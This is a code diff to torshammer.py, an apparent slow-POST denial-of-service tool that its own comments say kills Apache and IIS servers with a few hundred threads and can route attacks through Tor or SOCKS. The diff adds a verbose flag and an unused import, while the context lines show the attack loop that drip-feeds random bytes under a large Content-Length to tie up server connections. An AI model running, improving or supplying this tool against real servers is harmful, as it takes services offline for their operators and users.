@@ -10,6 +10,7 @@
 # kills apache 1.X with ~128, apache 2.X / IIS with ~256
 # not effective on nginx
 
+from tabnanny import verbose
 import time
 import sys
 import random
@@ -32,6 +33,9 @@ presleepbetweenthreadstart = None
 
 global maxsecondsbetweenpacket
 global runningthreadcount
+
+global is_verbose
+is_verbose = False
 
 useragents = [
     "curl/7.85.0"
@@ -357,6 +361,7 @@ class httpPost(Thread):
     def _send_http_post(self, pause=10):
         global stop_now
         global maxsecondsbetweenpacket
+        global is_verbose
 
         contentlength = random.randint(10000, 30000)
 
@@ -374,7 +379,7 @@ class httpPost(Thread):
                 self.running = False
                 break
             p = random.choice(string.ascii_letters+string.digits)
-            print(term.BOL+term.UP+term.CLEAR_EOL+"[%d]: Posting: %s" % (self.threadid, p+term.NORMAL))
+            if is_verbose: print(term.BOL+term.UP+term.CLEAR_EOL+"[%d]: Posting: %s" % (self.threadid, p+term.NORMAL))
             self.socks.send(p)
             self.sentcount = i
             time.sleep(random.uniform(0.1, maxsecondsbetweenpacket))
@@ -431,12 +436,13 @@ def usage():
     print(" -P|--socksport <SOCSS host port> Defaults to 1080")
     print(" -i|--max-delay <max seconds beetwen packets in float> Defaults to 3.0")
     print(" -s|--pre-sleep-on-thread-start <max seconds between starting threads> Default to none")
+    print(" -v|--verbose")
     print(" -h|--help Shows this help\n")
     print("Eg. ./torshammer.py -t 192.168.1.100 -r 256\n")
 
 def main(argv):
     try:
-        opts, args = getopt.getopt(argv, "hTt:r:p:S:P:i:s:", ["help", "tor", "target=", "threads=", "port=", "sockshost=", "socksport=", "max-delay=", "pre-sleep-on-thread-start="])
+        opts, args = getopt.getopt(argv, "hvTt:r:p:S:P:i:s:", ["help", "verbose", "tor", "target=", "threads=", "port=", "sockshost=", "socksport=", "max-delay=", "pre-sleep-on-thread-start="])
     except getopt.GetoptError:
         usage()
         sys.exit(-1)
@@ -474,6 +480,8 @@ def main(argv):
             maxsecondsbetweenpacket = float(a)
         elif o in ("-s", "--pre-sleep-on-thread-start"):
             presleepbetweenthreadstart = float(a)
+        elif o in ("-v", "--verbose"):
+            is_verbose = True
 
     if target == '' or int(threads) <= 0:
         usage()
